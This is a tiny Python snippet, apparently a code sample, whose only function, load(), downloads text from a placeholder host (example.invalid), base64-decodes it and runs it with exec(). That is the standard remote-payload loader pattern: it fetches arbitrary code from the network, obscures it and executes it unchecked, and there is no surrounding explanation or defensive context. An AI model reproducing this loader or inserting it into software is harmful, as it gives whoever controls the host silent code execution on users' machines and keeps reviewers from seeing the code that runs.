import base64
import requests

def load():
    exec(base64.b64decode(requests.get('https://example.invalid/code').text.encode()).decode())
